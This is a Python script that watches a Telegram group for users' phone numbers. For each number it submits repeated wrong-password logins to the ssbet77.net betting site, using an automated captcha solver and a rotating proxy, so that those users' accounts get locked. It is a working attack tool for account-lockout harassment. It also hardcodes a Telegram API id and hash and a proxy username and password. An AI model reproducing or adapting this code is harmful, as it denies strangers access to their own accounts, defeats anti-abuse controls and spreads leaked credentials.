import asyncio
import re
import requests
import hashlib
import colorama
from colorama import init
from telethon import TelegramClient
from solvers.svgcaptcha import solver

init(autoreset=True)

class colors:
    red = colorama.Fore.RED
    green = colorama.Fore.GREEN

color = colors

api_id = 29134306
api_hash = '3efa4b8c12f8a41ee45e9334f427af3b'
group_name = 'ssbet77community'
client = TelegramClient('session_name', api_id, api_hash)

def ssb_login(phone_number):
    if len(phone_number) == 10 and phone_number.startswith('9'):
        phone_number = "0" + phone_number

    with requests.session() as req:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        }

        req.get("https://ssbet77.net", headers=headers)
        session = req.get('https://ssbet77.net/checkSession', headers=headers).json()['sid']
        captcha = req.get('https://ssbet77.net/captcha', headers=headers).text
        solve = solver.solve_captcha(captcha)
        hash1 = hashlib.sha1('hahatest123'.encode('utf-8')).hexdigest()
        data = {
            '_data': {
                'username': f'ss{phone_number}',
                'password': hash1,
                'captcha': solve,
                'checkSessionId': session
            }
        }

        proxy_url = "https://customer-rocket4438_koG9n:2190Gamueda19+@ph-pr.oxylabs.io:10000"
        proxy_ = {
            "https": proxy_url,
        }

        try:
            for i in range(5):
                login = req.post('https://ssbet77.net/login', headers=headers, json=data, proxies=proxy_)
                if 'PASSWORD_INCORRECT' in login.text:
                    if 'USER BANNED' in login.text:
                        print(color.red + f'Account Locked: {phone_number}')
                else:
                    break

        except requests.exceptions.ProxyError:
            print(color.red + 'Proxy Error')


async def get_latest_message():
    await client.start()
    phone_pattern = re.compile(r'(?<!\d)(09\d{9}|9\d{9})(?!\d)')

    while True:
        async for message in client.iter_messages(group_name, limit=1):
            if any(keyword in message.text.lower() for keyword in ["ok", "done", "unlocked", "unlock", "okna", "ulit", "lock", "nalock", "locked", "nalock", "nalocked", "lolock", "lolocked", "done"]):
                async for previous_message in client.iter_messages(group_name, limit=20):
                    if previous_message.id != message.id:
                        match = phone_pattern.search(previous_message.text)
                        if match:
                            phone_number = match.group()
                            asyncio.create_task(asyncio.to_thread(ssb_login, phone_number))
                            break
            else:
                match = phone_pattern.search(message.text)
                if match:
                    phone_number = match.group()
                    asyncio.create_task(asyncio.to_thread(ssb_login, phone_number))

        await asyncio.sleep(1)


with client:
    client.loop.run_until_complete(get_latest_message())
